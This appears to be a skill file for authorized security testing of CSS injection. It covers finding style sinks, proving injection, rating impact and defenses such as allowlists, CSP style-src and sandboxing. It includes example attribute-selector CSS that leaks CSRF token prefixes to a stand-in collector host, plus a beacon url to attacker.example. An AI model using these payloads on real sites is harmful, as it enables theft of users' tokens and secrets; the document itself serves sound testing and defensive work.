---
name: css-injection-exfiltration
description: >
  Authorized assessment of CSS injection and data exfiltration techniques:
  attribute selectors, scroll-to-text, combination attacks with markup sinks,
  and defenses (strict style isolation, CSP style-src, sanitization). Use on
  owned apps where user-controlled CSS or style attributes exist — not for
  attacking third-party users without authorization.
---

# CSS Injection Exfiltration

## Scope And Authorization

- **In scope:** Applications you own or have written permission to test for CSS injection.
- **Out of scope:** Exfiltrating real user secrets from production without explicit RoE; attacking third parties.
- Prefer staging with synthetic secrets (fake CSRF tokens, test emails).
- Redact any real tokens discovered.
- Pair with XSS, CSP skills, and `code-quality-standards`.

## When To Use

- User-controlled CSS in themes, custom email templates, Markdown that allows style, or `style=` attributes.
- Blind CSS injection into admin-rendered pages.
- Evaluating whether CSP `style-src` blocks abuse.
- Researching attribute-selector exfil channels in modern browsers (as defenses evolve).

## Do Not Use As Primary

| Need | Skill instead |
| --- | --- |
| Script XSS | `xss-cross-site-scripting` |
| CSP nonce rollout | `csp-nonce-rotation` |
| UI CSS architecture | cascade/container CSS skills |
| CRLF/header injection | `crlf-injection` |
| Implementation quality baseline | `code-quality-standards` |

## Attack ideas (authorized lab)

| Technique | Sketch | Data targeted |
| --- | --- | --- |
| Attribute selectors | `input[name=csrf][value^=a]{background:url(...)}` | Token prefixes |
| Combinators + known DOM | Style based on sibling presence | Feature flags / roles |
| `@import` / `url()` | Mixed content / beacon | Confirm injection |
| Font/unicode tricks | Historical variants | Text nodes (often mitigated) |

**Note:** Browser privacy fixes continuously reduce classic attribute exfil reliability — always re-validate on current Chrome/Firefox/Safari; document engine version.

## Workflow

### 1. Confirm scope and success criteria

1. Locate CSS sinks: `style` attr, `<style>` blocks, theme CSS uploads, PDF/HTML email.
2. Success: sinks listed; impact demonstrated with synthetic data or ruled out; fixes prevent user CSS or isolate it.

### 2. Find sinks

```bash
rg -n 'style=|<style|dangerouslySetInnerHTML|background-image|custom_css' --glob '!node_modules'
# Proxies: user fields reflected into CSS context
```

### 3. Prove injection

```css
/* Harmless proof */
body { outline: 5px solid red !important; }
```

Or `background-image: url(https://attacker.example/hit)` on staging beacon you control.

### 4. Assess exfil feasibility (lab)

```css
/* Illustrative only — use test token values */
input[name="csrf"][value^="a"] {
  background-image: url("https://collector.example/leak?a");
}
input[name="csrf"][value^="b"] {
  background-image: url("https://collector.example/leak?b");
}
```

1. Measure whether requests fire in target browser.
2. Estimate entropy / time for full secret (often impractical now — still report injection).
3. Combine with markup if CSS-only is weak (but stay in scope).

### 5. Impact rating

| Finding | Typical rating notes |
| --- | --- |
| Arbitrary CSS in shared admin | Medium–High UI redress / phishing / residual exfil |
| Style attr with limited chars | Lower; still check breakout |
| CSP blocks external url() | Reduces exfil; UI injection may remain |
| Full XSS via style sink | Reclassify as XSS |

### 6. Defenses

1. **Do not** allow raw user CSS in privileged pages.
2. If themes required: strict parser allowlist (properties/values), not blacklist.
3. CSP: `style-src 'self' 'nonce-…'` (nonces on style tags carefully); avoid `'unsafe-inline'` for styles when possible.
4. Isolate untrusted HTML in sandboxed iframe with tightly controlled CSP.
5. Separate sensitive tokens from DOM `value` attributes when possible (e.g. not in HTML for CSRF double-submit readable cookie only — balance with app design).
6. Sanitize `style` attributes with vetted libraries.

### 7. Verify fix

1. Payload no longer applies attacker CSS.
2. Beacon receives no requests.
3. Regression tests for sanitizer allowlist.

## Good / Bad

| Topic | Good | Bad |
| --- | --- | --- |
| PoC | Staging + synthetic secrets | Live customer CSRF theft |
| Report | Engine versions + repro | Claim full exfil without beacon proof |
| Fix | Allowlist / remove sink | Filter `expression(` only |
| CSP | style-src disciplined | unsafe-inline forever |
| Themes | Server-side validated subset | Store arbitrary CSS for all users |

## Output Checklist

- [ ] CSS sinks mapped
- [ ] Injection proof captured
- [ ] Exfil channel tested or marked impractical with evidence
- [ ] Impact rated with browser versions
- [ ] Fix path chosen (remove/allowlist/CSP/sandbox)
- [ ] Retest clean
- [ ] Tests for sanitizer
- [ ] Related XSS escalations filed
- [ ] RoE/authorization noted
- [ ] Residual risk documented

## Rules

- Authorized testing only; synthetic secrets preferred.
- Browser mitigations change — evidence over folklore.
- Focus on **CSS injection and exfiltration risk** assessment/defense.
